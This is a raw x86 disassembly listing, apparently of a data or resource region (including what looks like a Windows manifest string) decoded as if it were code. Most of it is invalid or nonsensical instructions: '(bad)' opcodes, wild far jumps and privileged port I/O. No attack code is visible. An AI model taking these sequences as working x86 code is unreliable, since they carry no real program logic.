  420b74:	sub    al,0x27
  420b76:	loop   0x420b9b
  420b78:	jmp    0x90f78dad
  420b7d:	mov    WORD PTR [edx-0x64],gs
  420b80:	adc    BYTE PTR [edi],bh
  420b82:	ins    BYTE PTR es:[edi],dx
  420b83:	lods   eax,DWORD PTR ds:[esi]
  420b84:	dec    esp
  420b85:	jge    0x420b52
  420b87:	mov    ebp,0x57747474
  420b8c:	addr16 je 0x420c03
  420b8f:	scas   eax,DWORD PTR es:[edi]
  420b90:	icebp  
  420b91:	je     0x420c07
  420b93:	je     0x420b95
	...
  420b9d:	inc    esi
  420b9e:	fcomp  DWORD PTR [eax+0x77107662]
  420ba4:	mov    edx,esp
  420ba6:	aam    0x22
  420ba8:	jmp    0x420b5a
  420baa:	into   
  420bab:	jno    0x420c17
  420bad:	jbe    0x420bef
  420baf:	addr16 mov ds:0x1908,al
  420bb3:	std    
  420bb4:	push   cs
  420bb5:	push   0x6a
  420bb7:	push   0x6a
  420bb9:	push   0x6a
  420bbb:	push   0x6a
  420bbd:	push   0xffffff85
  420bbf:	test   ebp,eax
  420bc1:	sub    al,0xba
  420bc3:	fld    QWORD PTR [ebp-0x66869b7b]
  420bc9:	add    bl,cl
  420bcb:	pop    eax
  420bcc:	jmp    0xfef8:0x1827e593
  420bd3:	inc    esp
  420bd4:	push   ecx
  420bd5:	lahf   
  420bd6:	(bad)  
  420bd7:	pop    ebx
  420bd8:	sub    al,0x3e
  420bda:	ret    
  420bdb:	sub    DWORD PTR [ebp-0x35af9ae6],edi
  420be1:	and    BYTE PTR [eax],bh
  420be3:	sti    
  420be4:	mov    bl,dl
  420be6:	das    
  420be7:	xor    eax,0xe185855b
  420bec:	aad    0x85
  420bee:	test   DWORD PTR [esi],ebx
  420bf0:	cmp    eax,DWORD PTR [esi-0x22cf747b]
  420bf6:	popf   
  420bf7:	in     eax,dx
  420bf8:	addr16 xor cl,dh
  420bfb:	clc    
  420bfc:	scas   al,BYTE PTR es:[edi]
  420bfd:	js     0x420c1e
  420bff:	retf   
  420c00:	fidiv  DWORD PTR ss:[esi+0x6b]
  420c04:	xchg   esp,eax
  420c05:	lds    ecx,FWORD PTR [edx]
  420c07:	mov    esi,0x836d83eb
  420c0c:	mov    ecx,DWORD PTR [ebx-0x3e83c675]
  420c12:	cs push eax
  420c14:	jns    0x420c70
  420c16:	out    dx,al
  420c17:	inc    ebp
  420c18:	xchg   esp,eax
  420c19:	mov    ecx,DWORD PTR [ebp+0x53d3b2a5]
  420c1f:	ja     0x420c08
  420c21:	outs   dx,DWORD PTR ds:[esi]
  420c22:	loopne 0x420c1c
  420c24:	loope  0x420c75
  420c26:	adc    ah,ch
  420c28:	xchg   edi,eax
  420c29:	test   DWORD PTR [eax-0x55],esp
  420c2c:	mov    ecx,DWORD PTR [ebx-0x748b3890]
  420c32:	mov    ecx,DWORD PTR [ebx+0x0]
  420c38:	add    BYTE PTR [eax],al
  420c3a:	add    BYTE PTR [eax],al
  420c3c:	add    BYTE PTR [ecx+0x4044412],cl
  420c42:	add    al,0x4
  420c44:	add    al,0x4
  420c46:	add    al,0x4
  420c48:	add    al,0x0
  420c4a:	add    cl,al
  420c4c:	mul    DWORD PTR [esi]
  420c4e:	loopne 0x420c03
  420c50:	in     eax,dx
  420c51:	xor    eax,0x9de0e4
  420c56:	push   ss
  420c57:	dec    eax
  420c58:	into   
  420c59:	xchg   DWORD PTR [ecx],ebx
  420c5b:	mov    ebx,0xbf1964e
  420c60:	xchg   esp,eax
  420c61:	sub    ebx,DWORD PTR [esi+0x26240000]
  420c67:	add    BYTE PTR [eax],al
  420c69:	dec    ebp
  420c6a:	fiadd  WORD PTR [eax]
  420c6c:	add    BYTE PTR [esi+0x6b],ch
  420c6f:	int    0x3f
  420c71:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420c72:	adc    BYTE PTR [ecx],dh
  420c74:	and    ch,BYTE PTR [edx-0x2b]
  420c77:	ret    0xe9ee
  420c7a:	mov    ebx,0x7aa82102
  420c7f:	iret   
  420c80:	outs   dx,DWORD PTR ds:[esi]
  420c81:	pop    esi
  420c82:	aaa    
  420c83:	(bad)  
  420c84:	out    dx,al
  420c85:	add    BYTE PTR [eax-0x6f],dl
  420c88:	mov    BYTE PTR [edi+eax*2+0x4f505050],bl
  420c8f:	cmp    eax,0x1fbbb697
  420c94:	dec    ebp
  420c95:	inc    ebp
  420c96:	push   es
  420c97:	adc    BYTE PTR [ecx-0x4b],al
  420c9a:	sbb    eax,0x12550363
  420c9f:	jnp    0x420ce8
  420ca1:	mov    ch,ah
  420ca3:	loopne 0x420cf3
  420ca5:	pop    es
  420ca6:	mov    esi,0x470fcd30
  420cab:	push   0x64e32c8b
  420cb0:	test   eax,0x15a45050
  420cb5:	push   eax
  420cb6:	push   eax
  420cb7:	push   eax
	...
  420cc0:	add    BYTE PTR [edi-0x49],bl
  420cc3:	fld    QWORD PTR [eax]
	...
  420ccd:	add    BYTE PTR [eax],al
  420ccf:	jns    0x420d13
  420cd1:	jmp    0x420c7e
  420cd3:	int3   
  420cd4:	jb     0x420d36
  420cd6:	mov    eax,0xbcdd7d4
  420cdb:	scas   eax,DWORD PTR es:[edi]
  420cdc:	adc    al,0x11
  420cde:	add    eax,0x9465a972
  420ce3:	pop    ds
  420ce4:	aaa    
  420ce5:	cmp    ebp,ecx
  420ce7:	and    BYTE PTR [ebp+0x2e],ah
  420cea:	jne    0x420d61
  420cec:	bound  esp,QWORD PTR [ebx+0x73]
  420cef:	ins    DWORD PTR es:[edi],dx
  420cf0:	and    BYTE PTR [ebx+0x74],dh
  420cf3:	arpl   WORD PTR [ecx+0x6d],bp
  420cf6:	outs   dx,DWORD PTR ds:[esi]
  420cf7:	and    BYTE PTR [edi+0x73],ah
  420cfa:	jns    0x420d4c
  420cfc:	and    BYTE PTR [esi+0x53],dh
  420cff:	outs   dx,BYTE PTR gs:[si]
  420d02:	dec    ebp
  420d03:	push   0x6d446376
  420d08:	and    BYTE PTR fs:[ebx+0x65],dl
  420d0c:	jb     0x420d61
  420d0e:	jb     0x420d32
  420d10:	gs ds jae 0x420d34
  420d14:	gs jae 0x420d89
  420d17:	imul   esi,DWORD PTR [eax+0xd],0x69632020
  420d1e:	dec    ebp
  420d1f:	js     0x420d94
  420d21:	jb     0x420d8c
  420d23:	jo     0x420d61
  420d25:	imul   edi,DWORD PTR [esp+edi*1],0x63737674
  420d2c:	push   edi
  420d2d:	sub    BYTE PTR [ebx+0x61],dl
  420d30:	je     0x420da2
  420d32:	jbe    0x420d99
  420d34:	add    BYTE PTR [eax],al
  420d36:	pop    ebp
  420d37:	les    ebx,FWORD PTR [edx+0x1d]
  420d3a:	call   0x7b90f024
  420d3f:	pop    ebx
  420d40:	(bad)  
  420d42:	popa   
  420d43:	call   0x41022634
  420d48:	xchg   esi,eax
  420d49:	(bad)  
  420d4b:	leave  
  420d4c:	int    0x2b
  420d4e:	mov    WORD PTR [esi+eax*4],gs
  420d51:	cld    
  420d52:	jno    0x420d54
  420d54:	add    BYTE PTR [ebp+0x6d7a],bl
  420d5a:	das    
  420d5b:	out    dx,al
  420d5c:	call   0x790f561
  420d61:	call   0xf172:0xca7aed0d
  420d68:	int    0x2a
  420d6a:	add    esp,edi
  420d6c:	xchg   esi,eax
  420d6d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420d6e:	ja     0x420de5
  420d70:	sbb    eax,0x982eb8b2
  420d75:	or     DWORD PTR [edi],eax
  420d77:	call   0x3597f664
  420d7c:	call   0xe9097469
  420d81:	call   0xc102ce6e
  420d86:	rol    al,0xc0
  420d89:	rol    al,0xc0
  420d8c:	ss pop ecx
  420d8e:	mov    bh,0xcd
  420d90:	xor    eax,0xfd1f1491
  420d95:	mov    ecx,0x6b801d5a
  420d9a:	or     al,0x7b
  420d9c:	popf   
  420d9d:	js     0x420e13
  420d9f:	(bad)  
  420da0:	int    0x3
  420da2:	in     eax,0xb5
	...
  420dac:	add    BYTE PTR [eax],al
  420dae:	add    BYTE PTR [edi+0x9ceca5],ch
  420db4:	add    BYTE PTR [edi+0x180224d7],dh
  420dba:	(bad)  
  420dbb:	jbe    0x420d4f
  420dbd:	pop    esi
  420dbe:	fsubr  DWORD PTR [ebp+0x30]
  420dc1:	dec    eax
  420dc2:	jmp    0xf42eafde
  420dc7:	ins    DWORD PTR es:[edi],dx
  420dc8:	or     esp,esi
  420dca:	cdq    
  420dcb:	in     eax,dx
  420dcc:	pop    ebx
  420dcd:	sbb    edx,DWORD PTR [ebx-0x7a]
  420dd0:	cli    
  420dd1:	push   ss
  420dd2:	push   esp
  420dd3:	ins    DWORD PTR es:[edi],dx
  420dd4:	mov    al,0x7a
  420dd6:	popa   
  420dd7:	sub    BYTE PTR [eax],al
  420dd9:	add    BYTE PTR [ecx],bl
  420ddb:	mov    BYTE PTR [eax],0x0
  420dde:	add    ecx,DWORD PTR [ebx*8-0x5a483400]
  420de5:	fucom  st(7)
  420de7:	cmp    dl,0xd
  420dea:	loop   0x420e37
  420dec:	push   edi
  420dee:	or     eax,0x55c0dd55
  420df3:	out    0x1a,eax
  420df5:	sub    DWORD PTR [esp+edx*2],esp
  420df8:	dec    ebp
  420df9:	push   eax
  420dfa:	das    
  420dfb:	int3   
  420dfc:	int3   
  420dfd:	int3   
  420dfe:	aad    0x7c
  420e00:	or     esp,esi
  420e02:	std    
  420e03:	dec    ebx
  420e04:	hlt    
  420e05:	push   es
  420e06:	ss cld 
  420e08:	data16 scas al,BYTE PTR es:[edi]
  420e0a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420e0b:	mov    bl,0x59
  420e0d:	scas   al,BYTE PTR es:[edi]
  420e0e:	popf   
  420e0f:	and    al,0x89
  420e11:	mov    ds:0xb38ea126,eax
  420e16:	aam    0x82
  420e18:	fild   DWORD PTR [eax-0x20]
  420e1b:	int3   
  420e1c:	int3   
  420e1d:	xchg   ebp,eax
  420e1e:	mov    edx,0xcccccc5e
  420e23:	jne    0x420e9a
  420e25:	jne    0x420e9c
  420e27:	jne    0x420e9e
  420e29:	jne    0x420ea0
  420e2b:	jne    0x420df9
  420e2d:	mov    eax,ds:0x8d8d8d14
  420e32:	lea    ecx,[ebp-0x72727273]
  420e38:	mov    ecx,DWORD PTR [ebx-0x107399e8]
  420e3e:	add    DWORD PTR [ebx-0x70],eax
  420e41:	in     eax,dx
  420e42:	out    0xfc,eax
  420e44:	in     al,dx
  420e45:	jmp    0x420e8e
  420e47:	(bad)  
  420e48:	scas   eax,DWORD PTR es:[edi]
  420e49:	push   0x7d
  420e4b:	mov    ds:0x58911783,al
  420e50:	add    al,0x29
  420e52:	mov    ecx,DWORD PTR [ebx-0x74745346]
  420e58:	add    eax,eax
  420e5a:	mov    ecx,DWORD PTR [ebx-0x75b1dbc8]
  420e60:	fsubr  st(0),st
  420e62:	fidiv  WORD PTR [ebx]
  420e64:	jno    0x420ecb
  420e66:	push   ecx
  420e67:	jmp    0x4214:0x66fe4d16
  420e6e:	aad    0x7
  420e70:	mov    eax,0x8bade9dd
  420e75:	shr    BYTE PTR [esi-0x23],0x73
  420e79:	int3   
  420e7a:	rol    al,0xc0
  420e7d:	call   0x76961a20
  420e82:	lahf   
  420e83:	lods   al,BYTE PTR ds:[esi]
  420e84:	test   eax,0x3224ec9c
  420e89:	ds in  eax,0x1b
  420e8c:	repz mov edi,DWORD PTR [edx]
  420e8f:	fidiv  DWORD PTR [edx-0x67c097d9]
  420e95:	adc    eax,0x56382fff
  420e9a:	mov    DWORD PTR [esi-0x48bbb706],edi
  420ea0:	rol    al,0xcb
  420ea3:	gs rol al,0xc0
  420ea7:	jne    0x420f1e
  420ea9:	jne    0x420f20
  420eab:	jne    0x420f22
  420ead:	jne    0x420f24
  420eaf:	jne    0x420ef3
  420eb1:	pop    es
  420eb2:	outs   dx,DWORD PTR ds:[esi]
	...
  420ebb:	add    BYTE PTR [eax],al
  420ebd:	add    dh,dl
  420ebf:	in     al,0x2
  420ec1:	inc    edx
  420ec2:	mov    bh,cl
  420ec4:	(bad)  
  420ec5:	lahf   
  420ec6:	not    BYTE PTR [esi]
  420ec8:	add    al,0x3a
  420eca:	sub    ecx,edi
  420ecc:	add    edx,DWORD PTR [edx]
  420ece:	aam    0x9f
  420ed0:	sub    dh,BYTE PTR [esi]
  420ed2:	sub    BYTE PTR [ebx+0xc678],ah
  420ed8:	stc    
  420ed9:	out    dx,al
  420eda:	sbb    ch,bl
  420edc:	inc    esi
  420edd:	dec    ebp
  420ede:	fist   WORD PTR [ebx+edi*2-0xa]
  420ee2:	and    DWORD PTR [ebx+ebx*2-0x2a708bf8],eax
  420ee9:	and    eax,ebp
  420eeb:	mov    ch,0xf4
  420eed:	mov    al,0xc7
  420eef:	pushf  
  420ef0:	dec    eax
  420ef1:	xor    edx,edx
  420ef3:	out    0x98,al
  420ef5:	add    BYTE PTR [eax],al
  420ef7:	test   DWORD PTR ds:0x2f000059,esp
  420efd:	push   edi
  420efe:	imul   eax,DWORD PTR [eax],0xa5e7bfe8
  420f04:	outs   dx,BYTE PTR ds:[esi]
  420f05:	ds (bad) 
  420f07:	pop    esi
  420f08:	push   esp
  420f09:	sbb    bh,ch
  420f0b:	cmp    ebx,DWORD PTR [eax]
  420f0d:	xchg   ebp,eax
  420f0e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420f0f:	xlat   BYTE PTR ds:[ebx]
  420f10:	adc    dl,0x9d
  420f13:	loope  0x420f1a
  420f15:	fild   WORD PTR [eax+ecx*8]
  420f18:	out    0xe8,eax
  420f1a:	call   0xe8464707
  420f1f:	call   0xe92a5f1e
  420f24:	call   0x420f29
  420f29:	add    BYTE PTR [eax],al
  420f2b:	add    BYTE PTR [eax],al
  420f2d:	add    BYTE PTR [esp+edi*2],bl
  420f30:	add    esp,0x93f51091
  420f36:	repnz xor ch,dl
  420f39:	ror    DWORD PTR [edi-0x33],1
  420f3c:	sbb    edx,DWORD PTR [ecx+edi*2]
  420f3f:	jecxz  0x420f5f
  420f41:	int    0xbc
  420f43:	aad    0xcf
  420f45:	xchg   edi,eax
	...
  420f4e:	add    BYTE PTR [ebx+0x4016fd8b],cl
  420f54:	ins    DWORD PTR es:[edi],dx
  420f55:	mov    ecx,DWORD PTR [ebx-0x78e9b824]
  420f5b:	pusha  
  420f5c:	push   eax
  420f5d:	fidivr DWORD PTR [eax+0x52]
  420f60:	cmp    DWORD PTR [eax-0x7e],esi
  420f63:	mov    al,0xd7
  420f65:	in     eax,dx
  420f66:	(bad)  
  420f67:	adc    al,0x18
  420f69:	or     eax,0xf56fd81f
  420f6e:	pop    edi
  420f6f:	ds cs gs jae 0x420fe7
  420f74:	or     eax,0x43637270
  420f79:	jbe    0x420fbe
  420f7b:	jae    0x420f9d
  420f7d:	arpl   WORD PTR [ebx+edx*2+0x65],sp
  420f81:	ins    DWORD PTR es:[edi],dx
  420f82:	dec    ebp
  420f83:	gs jbe 0x420fef
  420f86:	imul   esp,DWORD PTR [edx+0x69],0x62706f20
  420f8d:	and    BYTE PTR [ecx+0x6d],ah
  420f90:	gs jae 0x421006
  420f93:	bound  ebp,QWORD PTR [ecx+0x6d]
  420f96:	jbe    0x420ffd
  420f98:	ds inc ebx
  420f9a:	gs jae 0x421000
  420f9d:	jb     0x421006
  420f9f:	ins    DWORD PTR es:[edi],dx
  420fa0:	push   ebx
  420fa1:	ins    DWORD PTR es:[edi],dx
  420fa2:	cmp    eax,0x6d652220
  420fa7:	ins    DWORD PTR es:[edi],dx
  420fa8:	jb     0x420fca
  420faa:	ds je  0x420fdb
  420fad:	and    BYTE PTR [eax],ah
  420faf:	and    dh,BYTE PTR [edx+0x65]
  420fb2:	and    edx,DWORD PTR [ebx+0x67]
  420fb5:	jo     0x421029
  420fb7:	outs   dx,BYTE PTR ds:[esi]
  420fb8:	and    BYTE PTR [ebp+0x6d],ah
  420fbb:	js     0x420fc7
  420fbd:	outs   dx,DWORD PTR ds:[esi]
  420fbe:	cs push ebx
  420fc0:	gs gs push 0x69442f6d
  420fc7:	je     0x421036
  420fc9:	and    ch,BYTE PTR [ebp+0x78]
  420fcc:	gs gs push edi
  420fcf:	cs cs js 0x421038
  420fd3:	gs ins DWORD PTR es:[edi],dx
  420fd5:	bound  esi,QWORD PTR [ebx+0x70]
  420fd8:	popa   
  420fd9:	and    BYTE PTR [esi],ch
  420fdb:	arpl   WORD PTR [ebx+0x20],si
  420fde:	ins    DWORD PTR es:[edi],dx
  420fdf:	ins    DWORD PTR es:[edi],dx
  420fe0:	push   ebx
  420fe1:	gs jb  0x42104a
  420fe4:	gs das 
  420fe6:	and    BYTE PTR [esi+0x61],dh
  420fe9:	ins    DWORD PTR es:[edi],dx
  420fea:	ins    BYTE PTR es:[edi],dx
  420feb:	je     0x421040
  420fed:	imul   esp,DWORD PTR [edx+ebx*4],0x923d1b71
  420ff4:	jne    0x420f9a
  420ff6:	shl    BYTE PTR ds:0x162a8b8b,1
  420ffc:	mov    ecx,DWORD PTR [ebx-0x745f4fd9]
  421002:	push   0x46
  421004:	in     al,0xc9
  421006:	fnstenv [eax+esi*4-0x43149f17]
  42100d:	add    al,0x40
  42100f:	mov    ds:0xad3a605c,eax
  421014:	jg     0x421031
  421016:	sbb    DWORD PTR [esp+ecx*8-0x13],esi
  42101a:	fisubr DWORD PTR [edx+0x6a]
  42101d:	push   0xfffffffd
  42101f:	add    eax,0xcbdccc6c
  421024:	and    edx,ebx
  421026:	(bad)  
  421027:	sti    
  421028:	cmp    eax,0xafcb4115
  42102d:	or     ah,BYTE PTR ds:0xc57cdee2
  421033:	fsub   st(7),st
  421035:	add    DWORD PTR ds:0xdce0ba35,0x6a
  42103c:	push   0x47
  42103e:	je     0x421044
  421040:	push   0x6a
  421042:	push   0x0
	...
  42104c:	adc    dh,dh
  42104e:	aas    
  42104f:	(bad)  
  421050:	(bad)  
  421051:	(bad)  
  421052:	(bad)  
  421053:	(bad)  
  421054:	(bad)  
  421055:	(bad)  
  421056:	(bad)  
  421057:	inc    DWORD PTR [eax]
  421059:	add    BYTE PTR [edi],ah
  42105b:	xchg   edi,eax
  42105c:	popf   
  42105d:	in     al,0x7d
  42105f:	gs fs inc ecx
  421062:	pop    edi
  421063:	mov    edx,ebx
  421065:	mov    bl,0x88
  421067:	js     0x421054
  421069:	mov    ch,0x15
  42106b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42106c:	sub    al,0x25
  42106e:	cs sub al,0x6a
  421071:	mov    esi,0xf90e0000
  421076:	add    BYTE PTR [eax],al
  421078:	push   0xffffffa6
  42107a:	add    BYTE PTR [eax],al
  42107c:	or     ebx,DWORD PTR [ecx-0x4]
  42107f:	nop
  421080:	mov    dh,0x84
  421082:	or     eax,0xff615721
  421087:	xor    BYTE PTR [esi],dl
  421089:	imul   eax,DWORD PTR [ebx-0x2f296dc2],0xff0e78ac
  421093:	push   ds
  421094:	add    BYTE PTR [ebp-0x7],al
  421097:	fstp   DWORD PTR [ebp+0x30]
  42109a:	inc    ebp
  42109b:	inc    ebp
  42109c:	inc    ebp
  42109d:	xor    BYTE PTR [ebp-0x7ccf6ffd],0x92
  4210a4:	mov    edi,ebx
  4210a6:	push   ebx
  4210a7:	sbb    edx,DWORD PTR [edx+0x50]
  4210aa:	inc    esp
  4210ab:	sahf   
  4210ac:	cvtpi2ps xmm5,mm6
  4210af:	cli    
  4210b0:	mov    ecx,0xc7423655
  4210b5:	mov    esp,0xbb0e1a83
  4210ba:	call   0xbfb2b8a2
  4210bf:	in     al,0x45
  4210c1:	inc    ebp
  4210c2:	cdq    
  4210c3:	inc    esi
  4210c4:	inc    ebp
  4210c5:	inc    ebp
  4210c6:	inc    ebp
  4210c7:	(bad)  
  4210c8:	(bad)  
  4210c9:	(bad)  
  4210ca:	(bad)  
  4210cb:	(bad)  
  4210cc:	(bad)  
  4210cd:	(bad)  
  4210ce:	(bad)  
  4210cf:	jmp    DWORD PTR [eax]
  4210d1:	adc    eax,0x40404a9
  4210d6:	add    al,0x4
  4210d8:	add    al,0x4
  4210da:	add    al,0x4
  4210dc:	mov    ecx,DWORD PTR [ebx+0x1e89e3dd]
  4210e2:	lods   eax,DWORD PTR ds:[esi]
  4210e3:	jns    0x4210b0
  4210e5:	mov    ebp,0x985b6d15
  4210ea:	jo     0x42108e
  4210ec:	xor    dl,bh
  4210ee:	das    
  4210ef:	stos   BYTE PTR es:[edi],al
  4210f0:	inc    esp
  4210f1:	cmp    DWORD PTR [esi-0x74a2c846],esi
  4210f7:	mov    ecx,ecx
  4210f9:	lods   al,BYTE PTR ds:[esi]
  4210fa:	cli    
  4210fb:	iret   
  4210fc:	ja     0x421159
  4210fe:	pop    edi
  4210ff:	cli    
  421100:	test   eax,0xe90762c9
  421105:	sub    ch,bl
  421107:	inc    ecx
  421108:	xchg   ebx,eax
  421109:	jb     0x4210d2
  42110b:	mov    edi,0x2254ebe9
  421110:	and    esi,DWORD PTR [edx-0x74ca7316]
  421116:	mov    eax,ebx
  421118:	push   esp
  421119:	inc    edi
  42111a:	mov    ecx,DWORD PTR [ebx-0x743ad744]
  421120:	add    ch,dh
  421122:	mov    DWORD PTR [esi+0x37],eax
  421125:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  421127:	int    0x11
  421129:	fld    DWORD PTR [esi]
  42112b:	push   esp
  42112c:	lahf   
  42112d:	sbb    DWORD PTR [ecx],0x1fcc8625
  421133:	mov    esp,ss
  421135:	call   0x0:0x55f6f9
  42113c:	test   al,0xed
  42113e:	add    BYTE PTR [eax],al
  421140:	das    
  421141:	push   cs
  421142:	add    BYTE PTR [eax],al
  421144:	add    BYTE PTR [ebx-0x74747475],cl
  42114a:	mov    ecx,DWORD PTR [ebx-0x73927475]
  421150:	(bad)
  421153:	cmp    ch,dh
  421155:	push   cs
  421156:	xchg   esi,eax
  421157:	test   esi,ecx
  421159:	in     al,dx
  42115a:	fisubr DWORD PTR [ebx]
  42115c:	and    BYTE PTR [edi-0x2e],bh
  42115f:	dec    edx
  421160:	mov    esp,0x16b2c862
  421165:	out    0xff,al
  421167:	(bad)  
  421168:	(bad)  
  421169:	(bad)  
  42116a:	(bad)  
  42116b:	(bad)  
  42116c:	(bad)  
  42116d:	(bad)  
  42116e:	inc    DWORD PTR [eax]
  421170:	add    BYTE PTR [ebp+0x88ad20],cl
  421176:	add    BYTE PTR [ebx+eax*8-0x4b],ch
  42117a:	aaa    
  42117b:	fist   DWORD PTR [ebx]
  42117d:	and    edx,DWORD PTR [esp+edx*1-0x6e]
  421181:	jbe    0x421143
  421183:	js     0x4211fb
  421185:	or     ebx,edi
  421187:	mov    WORD PTR [edx-0x6e88597],es
  42118d:	inc    edx
  42118e:	cmc    
  42118f:	pop    ebx
  421190:	cmc    
  421191:	pop    ds
  421192:	in     eax,0xaa
  421194:	lock aad 0xa1
  421197:	aaa    
  421198:	cli    
  421199:	push   ebx
  42119a:	add    BYTE PTR [eax],al
  42119c:	in     eax,0xb8
  42119e:	add    BYTE PTR [eax],al
  4211a0:	nop
  4211a1:	mov    eax,0xcaff00d8
  4211a6:	out    0xa2,eax
  4211a8:	fs jmp 0x99f:0xc5e9e8ee
  4211b0:	(bad)  
  4211b1:	xchg   ebx,eax
  4211b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4211b3:	pop    edi
  4211b4:	out    0x17,al
  4211b6:	dec    ecx
  4211b7:	(bad)  
  4211b8:	cld    
  4211b9:	fstp   DWORD PTR [eax-0xa6e7]
  4211bf:	push   DWORD PTR [ebx+0x430a156b]
  4211c5:	jmp    0xf488:0xb627dac6
  4211cc:	mov    ds:0x149b6113,al
  4211d1:	mov    cl,0xc9
  4211d3:	aaa    
  4211d4:	cmp    al,BYTE PTR [edx+0x7f]
  4211d7:	pop    ebx
  4211d8:	mov    esi,0x363ea5e9
  4211dd:	(bad)  
  4211de:	inc    DWORD PTR [edi-0x4fe]
  4211e4:	inc    DWORD PTR [eax]
	...
  4211ee:	and    al,0x2c
  4211f0:	cmp    al,BYTE PTR [eax]
	...
  4211fa:	mov    ecx,DWORD PTR [ebx-0x52bb19bd]
  421200:	hlt    
  421201:	sub    eax,0x25470127
  421206:	cli    
  421207:	push   ds
  421208:	mov    edi,0x342da2b8
  42120d:	stc    
  42120e:	mov    al,0xac
  421210:	ins    BYTE PTR es:[edi],dx
  421211:	push   ds
  421212:	push   es
  421213:	mov    ds:0xacb8b8b,eax
  421218:	mov    ecx,DWORD PTR [ebx-0x747407a1]
  42121e:	xchg   ebp,eax
  42121f:	inc    edi
  421220:	daa    
  421221:	mov    eax,0xce664b59
  421226:	lahf   
  421227:	test   eax,0x3d80e9b
  42122c:	dec    ebp
  42122d:	fst    DWORD PTR [ecx]
  42122f:	push   0x728255b1
  421234:	imul   bh
  421236:	mov    ecx,DWORD PTR [ebx-0x7c5d8ada]
  42123c:	mov    ecx,DWORD PTR [ebx-0x77b68775]
  421242:	push   esi
  421243:	sti    
  421244:	cmp    DWORD PTR [eax+0x2df31fdd],ebp
  42124a:	inc    ebx
  42124b:	ins    DWORD PTR es:[edi],dx
  42124c:	xchg   ecx,eax
  42124d:	pusha  
  42124e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42124f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421250:	stc    
  421251:	jnp    0x4212ae
  421253:	or     cl,BYTE PTR ds:0x8b717a57
  421259:	xor    al,BYTE PTR [ecx]
  42125b:	add    ah,BYTE PTR [edx-0x28c8fd31]
  421261:	mov    esi,0x59058b8b
  421266:	mov    ecx,DWORD PTR [ebx-0x76767675]
  42126c:	mov    DWORD PTR [ecx-0x76767677],ecx
  421272:	pop    esi
  421273:	mov    edx,0x9e
	...
  421280:	cmp    DWORD PTR [edx+ebx*2-0x1c520d9e],0xfffffff3
  421288:	mov    dh,dh
  42128a:	outs   dx,DWORD PTR ds:[esi]
  42128b:	jmp    0x5af463a4
  421290:	inc    ebp
  421291:	sub    bl,BYTE PTR [ebx+edi*1-0x56edadac]
  421298:	add    BYTE PTR [eax],al
  42129a:	xchg   ebp,eax
  42129b:	push   ebx
  42129c:	xchg   ebx,eax
  42129d:	adc    eax,0xca90918a
  4212a2:	shl    BYTE PTR [ebp+edi*1+0x76],cl
  4212a6:	cs or  al,0x84
  4212a9:	jmp    0x4212bb
  4212ab:	jmp    0x421316
  4212ad:	loopne 0x42131c
  4212af:	cmp    BYTE PTR [edx+0x65ebe003],0x4d
  4212b6:	pushf  
  4212b7:	add    BYTE PTR [eax],al
  4212b9:	or     ecx,DWORD PTR [ecx-0x4fffff6d]
  4212bf:	std    
  4212c0:	inc    ebx
  4212c1:	add    al,ch
  4212c3:	and    esi,DWORD PTR [eax+0x3bb54646]
  4212c9:	mov    edx,DWORD PTR [eax+0x50]
  4212cc:	adc    bl,BYTE PTR [esi+0x1e5208fb]
  4212d2:	jne    0x4212ab
  4212d4:	and    cl,BYTE PTR [ebx-0x65ebf381]
  4212da:	into   
  4212db:	call   0x6a0dfbc8
  4212e0:	call   0xe91356cd
  4212e5:	call   0x8dcfa0d2
  4212ea:	lea    ecx,[ebp-0x72727273]
  4212f0:	mov    dh,BYTE PTR [si]
  4212f3:	xchg   esi,eax
  4212f4:	pop    edi
  4212f5:	adc    al,0xcf
  4212f7:	cld    
  4212f8:	pop    ebx
  4212f9:	retf   0xdc5d
  4212fc:	sbb    al,0x51
  4212fe:	lods   eax,DWORD PTR ds:[esi]
  4212ff:	xor    esi,ebx
  421301:	adc    bl,bl
  421303:	pop    edi
  421304:	lds    edx,FWORD PTR [eax+ebx*1]
  421307:	ud0    edi,edi
  42130a:	(bad)  
  42130b:	(bad)  
  42130c:	(bad)  
  42130d:	(bad)  
  42130e:	(bad)  
  42130f:	(bad)  
  421310:	inc    DWORD PTR [eax]
  421312:	add    BYTE PTR [eax],ah
  421314:	retf   
  421315:	pop    esp
  421316:	in     al,dx
  421317:	add    BYTE PTR [eax],al
  421319:	enter  0x26d0,0x9f
  42131d:	(bad)  
  42131e:	leave  
  42131f:	das    
  421320:	mov    ecx,0x1f229167
  421325:	js     0x42136a
  421327:	(bad)  
  421329:	shr    DWORD PTR [ecx],0x37
  42132c:	stos   DWORD PTR es:[edi],eax
  42132d:	adc    DWORD PTR [ecx],esi
  42132f:	sub    eax,0x754a4a61
  421334:	add    DWORD PTR [esi+0x6c],esi
  421337:	xor    DWORD PTR [ecx],ebp
  421339:	xchg   edx,eax
  42133a:	sbb    DWORD PTR [ecx-0x7fa20000],esp
  421340:	add    BYTE PTR [eax],al
  421342:	cmp    ebx,DWORD PTR [ecx]
  421344:	inc    edi
  421345:	add    BYTE PTR [eax],al
  421347:	jmp    0xe8acacb7
  42134c:	sbb    esi,esp
  42134e:	fsubrp st(4),st
  421350:	dec    ebx
  421351:	js     0x42130a
  421353:	(bad)
  421356:	ja     0x421376
  421358:	fnsave [ecx]
  42135a:	sub    BYTE PTR [ecx+0x3d4917],bh
  421360:	add    BYTE PTR [eax],al
  421362:	and    eax,0x1d40049d
  421367:	in     eax,dx
  421368:	mov    ds:0x752a3fbd,eax
  42136d:	sub    al,0xbe
  42136f:	out    dx,al
  421370:	push   es
  421371:	neg    BYTE PTR [edx]
  421373:	xchg   ebp,eax
  421374:	sbb    eax,0x7561e944
  421379:	mov    dh,0x5d
  42137b:	cmc    
  42137c:	xor    DWORD PTR [edx],0xc2000049
  421382:	jbe    0x4213fe
  421384:	add    BYTE PTR [eax],al
  421386:	add    BYTE PTR [edx+0x6a],ch
  421389:	push   0x6a
  42138b:	push   0x6a
  42138d:	push   0x6a
  42138f:	push   0x3f
  421391:	add    cl,BYTE PTR ds:0x0
